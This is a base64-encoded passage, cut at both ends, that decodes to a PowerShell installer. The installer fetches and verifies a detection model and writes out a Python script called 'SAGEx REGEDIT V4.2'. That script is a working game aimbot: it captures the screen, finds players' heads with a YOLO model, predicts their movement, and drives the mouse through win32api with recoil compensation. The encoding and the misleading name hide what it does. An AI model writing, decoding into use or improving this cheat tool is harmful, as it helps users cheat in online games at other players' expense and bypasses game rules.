1jICJpbXBvcnQgJHBrZyIgMj4mMQ0KICAgICAgICAgICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICIgT0siIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgIHRocm93DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiIEluc3RhbGxpbmcuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQogICAgICAgICAgICAmIHB5dGhvbiAtbSBwaXAgaW5zdGFsbCAkcGtnIC0tcXVpZXQgLS1kaXNhYmxlLXBpcC12ZXJzaW9uLWNoZWNrDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFRlc3QtTW9kZWwgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJG1vZGVsRmlsZSkpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgJGhhc2ggPSAoR2V0LUZpbGVIYXNoIC1BbGdvcml0aG0gU0hBMjU2IC1QYXRoICRtb2RlbEZpbGUpLkhhc2gNCiAgICAgICAgcmV0dXJuICRoYXNoIC1lcSAkbW9kZWxIYXNoDQogICAgfQ0KICAgIGNhdGNoIHsgcmV0dXJuICRmYWxzZSB9DQp9DQoNCmZ1bmN0aW9uIEdldC1Nb2RlbCB7DQogICAgV3JpdGUtSG9zdCAiWytdIERvd25sb2FkaW5nIG1vZGVsLi4uIiAtRm9yZWdyb3VuZENvbG9yIEN5YW4NCiAgICB0cnkgew0KICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRtb2RlbFVybCAtT3V0RmlsZSAkbW9kZWxGaWxlIC1Vc2VCYXNpY1BhcnNpbmcNCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtTW9kZWwpKSB7DQogICAgICAgICAgICBSZW1vdmUtSXRlbSAkbW9kZWxGaWxlIC1Gb3JjZQ0KICAgICAgICAgICAgdGhyb3cgIk1vZGVsIHZlcmlmaWNhdGlvbiBmYWlsZWQgKEhhc2ggbWlzbWF0Y2gpIg0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIFdyaXRlLUhvc3QgIlstXSBFcnJvciBkb3dubG9hZGluZyBtb2RlbDogJF8iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENyZWF0ZS1QeXRob25TY3JpcHQgew0KQCcNCiMgU0FHRXggUkVHRURJVCBWNC4yIC0gSHlwZXJWaWdpbGFudCBFZGl0aW9uDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCBjdjINCmltcG9ydCB0aW1lDQppbXBvcnQgY3R5cGVzDQppbXBvcnQgbnVtcHkgYXMgbnANCmltcG9ydCBtc3MNCmltcG9ydCBsb2dnaW5nDQppbXBvcnQgUHlTaW1wbGVHVUkgYXMgc2cNCmZyb20gdWx0cmFseXRpY3MgaW1wb3J0IFlPTE8NCmltcG9ydCB3aW4zMmFwaQ0KaW1wb3J0IHdpbjMyY29uDQppbXBvcnQgd2luc291bmQNCmltcG9ydCBweWF1dG9ndWkNCmZyb20gUElMIGltcG9ydCBJbWFnZSwgSW1hZ2VUaw0KaW1wb3J0IHRocmVhZGluZw0KZnJvbSBjb2xsZWN0aW9ucyBpbXBvcnQgZGVxdWUNCg0KIyA9PT09PT09PT09PT09PT09IEhZUEVSVklHSUxBTlQgQ09ORklHID09PT09PT09PT09PT09PT0NCkhWX0NPTkZJRyA9IHsNCiAgICAiaGVhZHNob3RfcmF0aW8iOiAwLjExLCAgICAgICAgICAgICMgVWx0cmEtcHJlY2lzZSBoZWFkc2hvdCByYXRpbw0KICAgICJoZWFkX29mZnNldF95IjogLTEyLCAgICAgICAgICAgICAgIyBGaW5lLXR1bmVkIHZlcnRpY2FsIGFkanVzdG1lbnQNCiAgICAidGFyZ2V0X2ZwcyI6IDQ1MCwgICAgICAgICAgICAgICAgICMgRXh0cmVtZSBwcm9jZXNzaW5nIEZQUw0KICAgICJzY2FuX3Jlc29sdXRpb24iOiA1MTIsICAgICAgICAgICAgIyBIaWdoZXIgcmVzb2x1dGlvbiBmb3IgdmlnaWxhbmNlDQogICAgImFpbV9hY2NlbGVyYXRpb24iOiAyLjgsICAgICAgICAgICAjIEZhc3RlciBpbml0aWFsIGFpbQ0KICAgICJwcmVjaXNpb25fYm9vc3QiOiAwLjM1LCAgICAgICAgICAgIyBGaW5hbCBwcmVjaXNpb24gYWRqdXN0bWVudA0KICAgICJyZWNvaWxfY29tcGVuc2F0aW9uIjogNC41LCAgICAgICAgIyBTdHJvbmdlciByZWNvaWwgY29udHJvbA0KICAgICJtYXhfbGF0ZW5jeSI6IDAuMDAyLCAgICAgICAgICAgICAgIyBFeHRyZW1lLWxvdyBpbnB1dCBkZWxheSAoMm1zKQ0KICAgICJkeW5hbWljX3Ntb290aGluZyI6IFRydWUsICAgICAgICAgIyBBZGFwdGl2ZSBzbW9vdGhuZXNzDQogICAgInByZWRpY3Rpb24iOiBUcnVlLCAgICAgICAgICAgICAgICAjIEVuaGFuY2VkIHByZWRpY3Rpb24NCiAgICAicHJlZGljdGlvbl9mYWN0b3IiOiAwLjQ1LCAgICAgICAgICMgU3Ryb25nZXIgcHJlZGljdGlvbg0KICAgICJlZGdlX2RldGVjdGlvbiI6IFRydWUsICAgICAgICAgICAgIyBFZGdlIGRldGVjdGlvbiBmb3IgdmlnaWxhbmNlDQogICAgImNvbnRyYXN0X2Jvb3N0IjogMS41LCAgICAgICAgICAgICAjIEltYWdlIGNvbnRyYXN0IGVuaGFuY2VtZW50DQogICAgInZpZ2lsYW5jZV90aHJlc2hvbGQiOiAwLjY4LCAgICAgICAjIEhpZ2hlciBjb25maWRlbmNlIHRocmVzaG9sZA0KICAgICJtaW5faGVhZF9zaXplIjogMTIsICAgICAgICAgICAgICAgIyBNaW5pbXVtIGhlYWQgc2l6ZSBpbiBwaXhlbHMNCiAgICAibWF4X2hlYWRfc2l6ZSI6IDU1LCAgICAgICAgICAgICAgICMgTWF4aW11bSBoZWFkIHNpemUgaW4gcGl4ZWxzDQogICAgImhlYWRfd2lkdGhfbXVsdGlwbGllciI6IDAuNzUsICAgICAjIE11bHRpcGxpZXIgZm9yIGhlYWQgd2lkdGgNCiAgICAibmVja19vZmZzZXQiOiA2LCAgICAgICAgICAgICAgICAgICMgTmVjayBwb3NpdGlvbiBvZmZzZXQNCiAgICAidWlfdXBkYXRlX2ludGVydmFsIjogMC4wNSwgICAgICAgICMgVUkgdXBkYXRlIGludGVydmFsIGluIHNlY29uZHMgKDIwbXMpDQogICAgImRldGVjdGlvbl90aHJlYWRzIjogMiAgICAgICAgICAgICAjIE51bWJlciBvZiBkZXRlY3Rpb24gdGhyZWFkcw0KfQ0KDQojID09PT09PT09PT09PT09PT0gRU5IQU5DRUQgVUkgVEhFTUUgPT09PT09PT09PT09PT09PQ0Kc2cudGhlbWUoJ0RhcmtCbHVlMycpDQpzZy5zZXRfb3B0aW9ucyhmb250PSgnSGVsdmV0aWNhJywgMTEpKQ0KDQpjbGFzcyBBaW1ib3RDb25maWc6DQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmFjdGl2ZSA9IEZhbHNlDQogICAgICAgIHNlbGYuY29uZmlkZW5jZSA9IDAuNzYNCiAgICAgICAgc2VsZi5zbW9vdGhuZXNzID0gMC4xOA0KICAgICAgICBzZWxmLnNjYW5faW50ZXJ2YWwgPSAwLjAwNA0KICAgICAgICBzZWxmLmRyYWdfZGVsYXkgPSAwLjAwMw0KICAgICAgICBzZWxmLnJlZ2lvbl9zaXplID0gNDUwDQogICAgICAgIHNlbGYuZW5hYmxlX3NvdW5kID0gVHJ1ZQ0KICAgICAgICBzZWxmLmxhc3RfdGFyZ2V0cyA9IFtdDQogICAgICAgIHNlbGYudGFyZ2V0X2hpc3RvcnkgPSBkZXF1ZShtYXhsZW49NSkNCiAgICAgICAgc2VsZi51cGRhdGVfc2NyZWVuX3BhcmFtcygpDQogICAgICAgIHNlbGYuc3RhdHVzID0gIklOQUNUSVZFIg0KICAgICAgICBzZWxmLmRldGVjdGlvbl9zdGF0dXMgPSAiSURMRSINCiAgICAgICAgc2VsZi5jdXJyZW50X2ZwcyA9IDANCiAgICAgICAgc2VsZi5jdXJyZW50X2xhdGVuY3kgPSAwDQogICAgICAgIHNlbGYudGFyZ2V0X2NvdW50ID0gMA0KICAgICAgICBzZWxmLmxhc3RfdWlfdXBkYXRlID0gMA0KICAgICAgICBzZWxmLmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpDQogICAgICAgIA0KICAgIGRlZiB1cGRhdGVfc2NyZWVuX3BhcmFtcyhzZWxmKToNCiAgICAgICAgc2VsZi5zY3JlZW5fd2lkdGgsIHNlbGYuc2NyZWVuX2hlaWdodCA9IHB5YXV0b2d1aS5zaXplKCkNCiAgICAgICAgc2VsZi5yZWdpb25fbGVmdCA9IGludChzZWxmLnNjcmVlbl93aWR0aCAvLyAyIC0gc2VsZi5yZWdpb25fc2l6ZSAvLyAyKQ0KICAgICAgICBzZWxmLnJlZ2lvbl90b3AgPSBpbnQoc2VsZi5zY3JlZW5faGVpZ2h0IC8vIDIgLSBzZWxmLnJlZ2lvbl9zaXplIC8vIDIpDQogICAgICAgIHNlbGYuc2NyZWVuX3JlZ2lvbiA9IHsNCiAgICAgICAgICAgICJ0b3AiOiBzZWxmLnJlZ2lvbl90b3AsDQogICAgICAgICAgICAibGVmdCI6IHNlbGYucmVnaW9uX2xlZnQsDQogICAgICAgICAgICAid2lkdGgiOiBzZWxmLnJlZ2lvbl9zaXplLA0KICAgICAgICAgICAgImhlaWdodCI6IHNlbGYucmVnaW9uX3NpemUNCiAgICAgICAgfQ0KDQojID09PT09PT09PT09PT09PT0gSFlQRVJWSUdJTEFOVCBVSSA9PT09PT09PT09PT09PT09DQpkZWYgY3JlYXRlX2d1aSgpOg0KICAgIGxheW91dCA9IFsNCiAgICAgICAgW3NnLlRleHQoIlNBR0V4IFJFR0VESVQgVjQuMiAtIEh5cGVyVmlnaWxhbnQtRWRpdGlvbiIsIGZvbnQ9KCdIZWx2ZXRpY2EnLCAxOCwgJ2JvbGQnKSwganVzdGlmaWNhdGlvbj0nY2VudGVyJyldLA0KICAgICAgICBbc2cuSG9yaXpvbnRhbFNlcGFyYXRvcihwYWQ9KDAsIDEwKSldLA0KICAgICAgICBbDQogICAgICAgICAgICBzZy5GcmFtZSgnRGV0ZWN0aW9uIFNldHRpbmdzJywgWw0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCdDb25maWRlbmNlIFRocmVzaG9sZDonLCBzaXplPTE4KSwNCiAgICAgICAgICAgICAgICAgc2cuU2xpZGVyKCgwLjUsIDAuOSksIDAuNzYsIDAuMDEsIG9yaWVudGF0aW9uPSdoJywga2V5PSctQ09ORklERU5DRS0nLCBzaXplPSgyNSwxNSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgnU21vb3RobmVzczonLCBzaXplPTE4KSwNCiAgICAgICAgICAgICAgICAgc2cuU2xpZGVyKCgwLjEsIDAuNCksIDAuMTgsIDAuMDEsIG9yaWVudGF0aW9uPSdoJywga2V5PSctU01PT1RITkVTUy0nLCBzaXplPSgyNSwxNSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgnU2NhbiBSZWdpb246Jywgc2l6ZT0xOCksDQogICAgICAgICAgICAgICAgIHNnLlNsaWRlcigoMjAwLCA2MDApLCA0NTAsIDEwLCBvcmllbnRhdGlvbj0naCcsIGtleT0nLVJFR0lPTi0nLCBzaXplPSgyNSwxNSksIGVuYWJsZV9ldmVudHM9VHJ1ZSldLA0KICAgICAgICAgICAgICAgIFtzZy5DaGVja2JveCgnRW5hYmxlIFNvdW5kJywgZGVmYXVsdD1UcnVlLCBrZXk9Jy1TT1VORC0nKV0NCiAgICAgICAgICAgIF0sIHNpemU9KDMwMCwgMTYwKSksDQogICAgICAgICAgICANCiAgICAgICAgICAgIHNnLlZlcnRpY2FsU2VwYXJhdG9yKCksDQogICAgICAgICAgICANCiAgICAgICAgICAgIHNnLkZyYW1lKCdTdGF0dXMgUGFuZWwnLCBbDQogICAgICAgICAgICAgICAgW3NnLlRleHQoJ0FpbWJvdCBTdGF0dXM6Jywgc2l6ZT0xMiksIA0KICAgICAgICAgICAgICAgICBzZy5UZXh0KCdJTkFDVElWRScsIGtleT0nLVNUQVRVUy0nLCB0ZXh0X2NvbG9yPSdyZWQnLCBzaXplPTEwLCBmb250PSgnSGVsdmV0aWNhJywgMTEsICdib2xkJykpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgnRGV0ZWN0aW9uIFN0YXR1czonLCBzaXplPTEyKSwNCiAgICAgICAgICAgICAgICAgc2cuVGV4dCgnSURMRScsIGtleT0nLURFVEVDVElPTi0nLCB0ZXh0X2NvbG9yPSd5ZWxsb3cnLCBzaXplPTEwLCBmb250PSgnSGVsdmV0aWNhJywgMTEpKV0sDQogICAgICAgICAgICAgICAgW3NnLkJ1dHRvbignVE9HR0xFIEFJTUJPVCAoRjYpJywgc2l6ZT0oMTgsIDIpLCBrZXk9Jy1UT0dHTEUtJywgYnV0dG9uX2NvbG9yPSgnd2hpdGUnLCAnIzRDQUY1MCcpKV0sDQogICAgICAgICAgICAgICAgW3NnLkJ1dHRvbignRVhJVCAoRjgpJywgc2l6ZT0oMTgsIDIpLCBrZXk9Jy1FWElULScsIGJ1dHRvbl9jb2xvcj0oJ3doaXRlJywgJyNGNDQzMzYnKSldDQogICAgICAgICAgICBdLCBzaXplPSgzMDAsIDE2MCkpDQogICAgICAgIF0sDQogICAgICAgIFtzZy5Ib3Jpem9udGFsU2VwYXJhdG9yKHBhZD0oMCwgMTApKV0sDQogICAgICAgIFsNCiAgICAgICAgICAgIHNnLkZyYW1lKCdQZXJmb3JtYW5jZScsIFsNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgnRlBTOicsIHNpemU9MTApLCBzZy5UZXh0KCcwJywga2V5PSctRlBTLScsIHNpemU9OCldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCdMYXRlbmN5OicsIHNpemU9MTApLCBzZy5UZXh0KCcwbXMnLCBrZXk9Jy1MQVRFTkNZLScsIHNpemU9OCldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCdUYXJnZXRzOicsIHNpemU9MTApLCBzZy5UZXh0KCcwJywga2V5PSctVEFSR0VUUy0nLCBzaXplPTgpXQ0KICAgICAgICAgICAgXSwgc2l6ZT0oMjAwLCAxMDApKSwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgc2cuRnJhbWUoJ0RldGVjdGlvbiBQcmV2aWV3JywgWw0KICAgICAgICAgICAgICAgIFtzZy5JbWFnZShmaWxlbmFtZT0nJywga2V5PSctUFJFVklFVy0nLCBzaXplPSgyMDAsIDEwMCkpXQ0KICAgICAgICAgICAgXSwgc2l6ZT0oMjAwLCAxMDApKQ0KICAgICAgICBdDQogICAgXQ0KICAgIA0KICAgIHdpbmRvdyA9IHNnLldpbmRvdygiU0FHRXggUkVHRURJVCBWNC4yIC0gSHlwZXJWaWdpbGFudCBFZGl0aW9uIiwgDQogICAgICAgICAgICAgICAgICAgICAgbGF5b3V0LCANCiAgICAgICAgICAgICAgICAgICAgICBmaW5hbGl6ZT1UcnVlLCANCiAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50X2p1c3RpZmljYXRpb249J2NlbnRlcicsDQogICAgICAgICAgICAgICAgICAgICAgcmV0dXJuX2tleWJvYXJkX2V2ZW50cz1UcnVlKQ0KICAgIA0KICAgICMgU2V0IHdpbmRvdyB0byBzdGF5IG9uIHRvcA0KICAgIGh3bmQgPSBjdHlwZXMud2luZGxsLnVzZXIzMi5HZXRQYXJlbnQod2luZG93LlRLcm9vdC53aW5mb19pZCgpKQ0KICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLlNldFdpbmRvd1Bvcyhod25kLCAtMSwgMCwgMCwgMCwgMCwgMHgwMDAxKQ0KICAgIA0KICAgIHJldHVybiB3aW5kb3cNCg0KIyA9PT09PT09PT09PT09PT09IExJR0hUTklORyBGQVNUIERFVEVDVElPTiA9PT09PT09PT09PT09PT09DQpkZWYgZW5oYW5jZV9pbWFnZShpbWcpOg0KICAgICMgVWx0cmEtZmFzdCBpbWFnZSBlbmhhbmNlbWVudCB1c2luZyBvcHRpbWl6ZWQgT3BlbkNWIG9wZXJhdGlvbnMNCiAgICBpZiBIVl9DT05GSUdbImNvbnRyYXN0X2Jvb3N0Il0gPiAxLjA6DQogICAgICAgIGxhYiA9IGN2Mi5jdnRDb2xvcihpbWcsIGN2Mi5DT0xPUl9CR1IyTEFCKQ0KICAgICAgICBsLCBhLCBiID0gY3YyLnNwbGl0KGxhYikNCiAgICAgICAgY2xhaGUgPSBjdjIuY3JlYXRlQ0xBSEUoY2xpcExpbWl0PTMuMCwgdGlsZUdyaWRTaXplPSg0LDQpKSAgIyBTbWFsbGVyIGdyaWQgZm9yIGZhc3RlciBwcm9jZXNzaW5nDQogICAgICAgIGwgPSBjbGFoZS5hcHBseShsKQ0KICAgICAgICBpbWcgPSBjdjIubWVyZ2UoKGwsYSxiKSkNCiAgICAgICAgaW1nID0gY3YyLmN2dENvbG9yKGltZywgY3YyLkNPTE9SX0xBQjJCR1IpDQogICAgDQogICAgaWYgSFZfQ09ORklHWyJlZGdlX2RldGVjdGlvbiJdOg0KICAgICAgICBncmF5ID0gY3YyLmN2dENvbG9yKGltZywgY3YyLkNPTE9SX0JHUjJHUkFZKQ0KICAgICAgICBlZGdlcyA9IGN2Mi5DYW5ueShncmF5LCA2MCwgMTIwKSAgIyBPcHRpbWl6ZWQgdGhyZXNob2xkcw0KICAgICAgICBpbWcgPSBjdjIuYWRkV2VpZ2h0ZWQoaW1nLCAwLjcsIGN2Mi5jdnRDb2xvcihlZGdlcywgY3YyLkNPTE9SX0dSQVkyQkdSKSwgMC4zLCAwKQ0KICAgIA0KICAgIHJldHVybiBpbWcNCg0KZGVmIGRldGVjdF90YXJnZXRzKGNvbmZpZywgbW9kZWwsIHNjdCk6DQogICAgdHJ5Og0KICAgICAgICAjIEdyYWIgc2NyZWVuIHdpdGggbWluaW1hbCBvdmVyaGVhZA0KICAgICAgICBpbWcgPSBucC5hcnJheShzY3QuZ3JhYihjb25maWcuc2NyZWVuX3JlZ2lvbiksIGR0eXBlPW5wLnVpbnQ4KQ0KICAgICAgICBpbWcgPSBjdjIuY3Z0Q29sb3IoaW1nLCBjdjIuQ09MT1JfQkdSQTJCR1IpDQogICAgICAgIA0KICAgICAgICAjIEZhc3QgcmVzaXplIGFuZCBlbmhhbmNlbWVudA0KICAgICAgICBpbWcgPSBjdjIucmVzaXplKGltZywgKEhWX0NPTkZJR1sic2Nhbl9yZXNvbHV0aW9uIl0sIEhWX0NPTkZJR1sic2Nhbl9yZXNvbHV0aW9uIl0pKQ0KICAgICAgICBpbWcgPSBlbmhhbmNlX2ltYWdlKGltZykNCiAgICAgICAgDQogICAgICAgICMgVWx0cmEtZmFzdCBkZXRlY3Rpb24gd2l0aCBvcHRpbWl6ZWQgcGFyYW1ldGVycw0KICAgICAgICByZXN1bHRzID0gbW9kZWwoaW1nLCANCiAgICAgICAgICAgICAgICAgICAgICBjb25mPW1heChjb25maWcuY29uZmlkZW5jZSwgSFZfQ09ORklHWyJ2aWdpbGFuY2VfdGhyZXNob2xkIl0pLA0KICAgICAgICAgICAgICAgICAgICAgIGltZ3N6PUhWX0NPTkZJR1sic2Nhbl9yZXNvbHV0aW9uIl0sDQogICAgICAgICAgICAgICAgICAgICAgaGFsZj1UcnVlLA0KICAgICAgICAgICAgICAgICAgICAgIGlvdT0wLjQsDQogICAgICAgICAgICAgICAgICAgICAgYWdub3N0aWNfbm1zPVRydWUsDQogICAgICAgICAgICAgICAgICAgICAgdmVyYm9zZT1GYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgICBkZXZpY2U9J2NwdScpICAjIFVzaW5nIENQVSBmb3IgbW9yZSBjb25zaXN0ZW50IHBlcmZvcm1hbmNlDQogICAgICAgIA0KICAgICAgICBib3hlcyA9IHJlc3VsdHNbMF0uYm94ZXMueHl4eS5jcHUoKS5udW1weSgpDQogICAgICAgIGNsYXNzZXMgPSByZXN1bHRzWzBdLmJveGVzLmNscy5jcHUoKS5udW1weSgpDQogICAgICAgIGNvbmZpZGVuY2VzID0gcmVzdWx0c1swXS5ib3hlcy5jb25mLmNwdSgpLm51bXB5KCkNCiAgICAgICAgDQogICAgICAgIHRhcmdldHMgPSBbXQ0KICAgICAgICANCiAgICAgICAgZm9yIGksIGJveCBpbiBlbnVtZXJhdGUoYm94ZXMpOg0KICAgICAgICAgICAgaWYgaW50KGNsYXNzZXNbaV0pID09IDA6ICAjIFBlcnNvbiBjbGFzcw0KICAgICAgICAgICAgICAgIHgxLCB5MSwgeDIsIHkyID0gbWFwKGludCwgYm94KQ0KICAgICAgICAgICAgICAgIGJvZHlfd2lkdGggPSB4MiAtIHgxDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIyBIeXBlci1wcmVjaXNlIGhlYWQgY2FsY3VsYXRpb24NCiAgICAgICAgICAgICAgICBoZWFkX3dpZHRoID0gbWluKG1heChpbnQoYm9keV93aWR0aCAqIEhWX0NPTkZJR1siaGVhZF93aWR0aF9tdWx0aXBsaWVyIl0pLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSFZfQ09ORklHWyJtYXhfaGVhZF9zaXplIl0pLCBIVl9DT05GSUdbIm1pbl9oZWFkX3NpemUiXSkNCiAgICAgICAgICAgICAgICBoZWFkX3ggPSAoeDEgKyB4MikgLy8gMg0KICAgICAgICAgICAgICAgIGhlYWRfeSA9IHkxICsgaW50KGhlYWRfd2lkdGggKiBIVl9DT05GSUdbImhlYWRzaG90X3JhdGlvIl0pICsgSFZfQ09ORklHWyJoZWFkX29mZnNldF95Il0gLSAoDQogICAgICAgICAgICAgICAgICAgIEhWX0NPTkZJR1sibmVja19vZmZzZXQiXSBpZiBib2R5X3dpZHRoID4gMjUgZWxzZSAwKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICMgQ29udmVydCB0byBzY3JlZW4gY29vcmRzIHdpdGggc3ViLXBpeGVsIHByZWNpc2lvbg0KICAgICAgICAgICAgICAgIHNjYWxlID0gY29uZmlnLnJlZ2lvbl9zaXplIC8gSFZfQ09ORklHWyJzY2FuX3Jlc29sdXRpb24iXQ0KICAgICAgICAgICAgICAgIHNjcmVlbl94ID0gY29uZmlnLnJlZ2lvbl9sZWZ0ICsgKGhlYWRfeCAqIHNjYWxlKQ0KICAgICAgICAgICAgICAgIHNjcmVlbl95ID0gY29uZmlnLnJlZ2lvbl90b3AgKyAoaGVhZF95ICogc2NhbGUpDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdGFyZ2V0cy5hcHBlbmQoew0KICAgICAgICAgICAgICAgICAgICAneCc6IHNjcmVlbl94LA0KICAgICAgICAgICAgICAgICAgICAneSc6IHNjcmVlbl95LA0KICAgICAgICAgICAgICAgICAgICAnY29uZmlkZW5jZSc6IGNvbmZpZGVuY2VzW2ldLA0KICAgICAgICAgICAgICAgICAgICAnd2lkdGgnOiBib2R5X3dpZHRoDQogICAgICAgICAgICAgICAgfSkNCiAgICAgICAgDQogICAgICAgICMgRW5oYW5jZWQgcHJlZGljdGlvbiB3aXRoIGhpc3RvcnkNCiAgICAgICAgaWYgSFZfQ09ORklHWyJwcmVkaWN0aW9uIl0gYW5kIHRhcmdldHMgYW5kIGNvbmZpZy50YXJnZXRfaGlzdG9yeToNCiAgICAgICAgICAgIGF2Z19tb3ZlbWVudCA9IG5wLm1lYW4oWw0KICAgICAgICAgICAgICAgICh0Wyd4J10gLSBoWyd4J10sIHRbJ3knXSAtIGhbJ3knXSkgDQogICAgICAgICAgICAgICAgZm9yIHQsIGggaW4gemlwKHRhcmdldHMsIGNvbmZpZy50YXJnZXRfaGlzdG9yeVstMV0pDQogICAgICAgICAgICBdLCBheGlzPTApDQogICAgICAgICAgICANCiAgICAgICAgICAgIGZvciB0YXJnZXQgaW4gdGFyZ2V0czoNCiAgICAgICAgICAgICAgICB0YXJnZXRbJ3gnXSArPSBhdmdfbW92ZW1lbnRbMF0gKiBIVl9DT05GSUdbInByZWRpY3Rpb25fZmFjdG9yIl0NCiAgICAgICAgICAgICAgICB0YXJnZXRbJ3knXSArPSBhdmdfbW92ZW1lbnRbMV0gKiBIVl9DT05GSUdbInByZWRpY3Rpb25fZmFjdG9yIl0NCiAgICAgICAgDQogICAgICAgICMgVXBkYXRlIHRhcmdldCBoaXN0b3J5DQogICAgICAgIGlmIHRhcmdldHM6DQogICAgICAgICAgICBjb25maWcudGFyZ2V0X2hpc3RvcnkuYXBwZW5kKHRhcmdldHMpDQogICAgICAgIA0KICAgICAgICByZXR1cm4gdGFyZ2V0cywgaW1nDQogICAgDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBsb2dnaW5nLmVycm9yKGYiRGV0ZWN0aW9uIGVycm9yOiB7c3RyKGUpfSIpDQogICAgICAgIHJldHVybiBbXSwgTm9uZQ0KDQojID09PT09PT09PT09PT09PT0gUFJFQ0lTSU9OIEFJTUlORyA9PT09PT09PT09PT09PT09DQpkZWYgcHJlY2lzaW9uX2FpbShjb25maWcsIHRhcmdldF94LCB0YXJnZXRfeSk6DQogICAgdHJ5Og0KICAgICAgICBzdGFydF90aW1lID0gdGltZS5wZXJmX2NvdW50ZXIoKQ0KICAgICAgICBjeCwgY3kgPSBweWF1dG9ndWkucG9zaXRpb24oKQ0KICAgICAgICBkeCA9IHRhcmdldF94IC0gY3gNCiAgICAgICAgZHkgPSB0YXJnZXRfeSAtIGN5DQogICAgICAgIGRpc3RhbmNlID0gbnAuaHlwb3QoZHgsIGR5KQ0KICAgICAgICANCiAgICAgICAgIyBEeW5hbWljIHNtb290aGluZyB3aXRoIG9wdGltaXplZCBjdXJ2ZQ0KICAgICAgICBpZiBIVl9DT05GSUdbImFkYXB0aXZlX3Ntb290aGluZyJdOg0KICAgICAgICAgICAgaWYgZGlzdGFuY2UgPiAxODA6DQogICAgICAgICAgICAgICAgc21vb3RoX2ZhY3RvciA9IGNvbmZpZy5zbW9vdGhuZXNzICogMC4yNQ0KICAgICAgICAgICAgZWxpZiBkaXN0YW5jZSA+IDgwOg0KICAgICAgICAgICAgICAgIHNtb290aF9mYWN0b3IgPSBjb25maWcuc21vb3RobmVzcyAqIDAuNA0KICAgICAgICAgICAgZWxpZiBkaXN0YW5jZSA+IDMwOg0KICAgICAgICAgICAgICAgIHNtb290aF9mYWN0b3IgPSBjb25maWcuc21vb3RobmVzcyAqIDAuNw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBzbW9vdGhfZmFjdG9yID0gY29uZmlnLnNtb290aG5lc3MgKiAyLjINCiAgICAgICAgDQogICAgICAgIHN0ZXBzID0gbWF4KGludChkaXN0YW5jZSAvIHNtb290aF9mYWN0b3IpLCAxKQ0KICAgICAgICANCiAgICAgICAgIyBPcHRpbWl6ZWQgYWltaW5nIGxvb3ANCiAgICAgICAgZm9yIGkgaW4gcmFuZ2Uoc3RlcHMpOg0KICAgICAgICAgICAgaWYgbm90IHdpbjMyYXBpLkdldEFzeW5jS2V5U3RhdGUod2luMzJjb24uVktfTEJVVFRPTikgJiAweDgwMDA6DQogICAgICAgICAgICAgICAgcmV0dXJuIDANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcHJvZ3Jlc3MgPSBpIC8gc3RlcHMNCiAgICAgICAgICAgIGFjY2VsID0gKEhWX0NPTkZJR1siYWltX2FjY2VsZXJhdGlvbiJdICogKDEgLSBwcm9ncmVzcykqKjMgKyANCiAgICAgICAgICAgICAgICAgICAgSFZfQ09ORklHWyJwcmVjaXNpb25fYm9vc3QiXSAqIHByb2dyZXNzKiozKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBteCA9IGludChkeCAvIHN0ZXBzICogYWNjZWwpDQogICAgICAgICAgICBteSA9IGludChkeSAvIHN0ZXBzICogYWNjZWwpDQogICAgICAgICAgICANCiAgICAgICAgICAgICMgRW5oYW5jZWQgcmVjb2lsIGNvbXBlbnNhdGlvbg0KICAgICAgICAgICAgaWYgSFZfQ09ORklHWyJyZWNvaWxfY29tcGVuc2F0aW9uIl0gYW5kIGkgJSAyID09IDA6DQogICAgICAgICAgICAgICAgbXkgKz0gaW50KEhWX0NPTkZJR1sicmVjb2lsX2NvbXBlbnNhdGlvbiJdICogKDEgKyBkaXN0YW5jZS80MDApKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICB3aW4zMmFwaS5tb3VzZV9ldmVudCgweDAwMDEsIG14LCBteSwgMCwgMCkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAobWF4KGNvbmZpZy5kcmFnX2RlbGF5LCBIVl9DT05GSUdbIm1heF9sYXRlbmN5Il0pKQ0KICAgICAgICANCiAgICAgICAgIyBGaW5hbCBtaWNyby1hZGp1c3RtZW50DQogICAgICAgIHJlbWFpbmluZ194ID0gdGFyZ2V0X3ggLSBweWF1dG9ndWkucG9zaXRpb24oKVswXQ0